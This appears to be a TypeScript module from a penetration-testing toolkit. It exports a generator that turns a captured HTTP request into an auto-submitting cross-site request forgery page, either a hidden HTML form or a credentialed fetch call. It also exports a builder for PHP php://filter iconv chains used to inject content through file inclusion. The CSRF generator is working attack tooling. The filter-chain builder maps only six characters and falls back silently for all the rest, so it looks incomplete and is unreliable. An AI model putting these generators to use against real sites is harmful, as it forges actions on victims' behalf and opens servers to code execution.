
/**
 * CSRF Generator Logic
 */
export const generateCSRFPoC = (rawRequest: string, autoSubmit: boolean, type: 'form' | 'fetch' = 'form') => {
  const parts = rawRequest.split('\n\n');
  const headersPart = parts[0];
  const bodyPart = parts[1] || '';

  const headerLines = headersPart.split('\n');
  const firstLine = headerLines[0].split(' ');
  const method = firstLine[0] || 'POST';
  const path = firstLine[1] || '/';

  const hostHeader = headerLines.find(l => l.toLowerCase().startsWith('host: '));
  const host = hostHeader ? hostHeader.split(': ')[1].trim() : 'localhost';
  const url = `http://${host}${path}`;

  if (type === 'fetch') {
    // Fetch API PoC
    let fetchOptions: any = {
      method: method,
      mode: 'cors',
      credentials: 'include',
    };

    // Try to parse body
    if (bodyPart.trim()) {
      fetchOptions.body = bodyPart.trim();
      // Add content-type if detected
      if (bodyPart.trim().startsWith('{')) {
        fetchOptions.headers = { 'Content-Type': 'application/json' };
      } else if (bodyPart.includes('=')) {
        fetchOptions.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
      }
    }

    return `<html>
  <body>
    <script>
      fetch('${url}', ${JSON.stringify(fetchOptions, null, 2)})
        .then(response => response.text())
        .then(data => console.log(data))
        .catch(error => console.error(error));
    </script>
    <h1>CSRF PoC Initiated (Check Console)</h1>
  </body>
</html>`;
  }

  // classic Form PoC
  let params: { [key: string]: string } = {};

  if (bodyPart.includes('=') && !bodyPart.trim().startsWith('{')) {
    // Form encoded
    bodyPart.split('&').forEach(p => {
      const [k, v] = p.split('=');
      if (k) params[decodeURIComponent(k)] = decodeURIComponent(v || '');
    });
  } else if (bodyPart.trim().startsWith('{')) {
    // JSON attempt conversion to hidden inputs (flawed for strict JSON APIs but standard for this technique)
    try {
      const parsed = JSON.parse(bodyPart);
      Object.keys(parsed).forEach(k => params[k] = typeof parsed[k] === 'object' ? JSON.stringify(parsed[k]) : parsed[k]);
    } catch (e) {
      console.error("JSON parse failed for body");
    }
  }

  const inputs = Object.entries(params)
    .map(([k, v]) => `    <input type="hidden" name="${k}" value='${String(v).replace(/'/g, "&#39;")}' />`)
    .join('\n');

  return `<html>
  <body onload="${autoSubmit ? 'document.forms[0].submit()' : ''}">
    <form action="${url}" method="${method}">
${inputs}
      <input type="submit" value="Submit Request" />
    </form>
    ${autoSubmit ? '<script>document.forms[0].submit();</script>' : ''}
  </body>
</html>`;
};

/**
 * PHP Filter Chain Logic
 */
export const generatePHPFilterChain = (payload: string) => {
  const b64 = btoa(payload).replace(/=/g, '');

  // Expanded Oracle
  const oracle: Record<string, string> = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1161|convert.iconv.CP9066.UCS2',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.ISO10646-1.UCS-2',
    'B': 'convert.iconv.ISO8859-1.UTF-16BE|convert.iconv.ISO-10646-UCS-4',
    'C': 'convert.iconv.IBM866.UTF-16|convert.iconv.ISO-10646-UCS-4',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
  };

  let chain = 'php://filter/read=convert.base64-encode';
  for (let i = b64.length - 1; i >= 0; i--) {
    const char = b64[i];
    const filter = oracle[char] || 'convert.iconv.UTF8.UTF7';
    chain += `|${filter}|convert.base64-decode|convert.base64-encode`;
  }
  return chain + '/resource=php://temp';
};
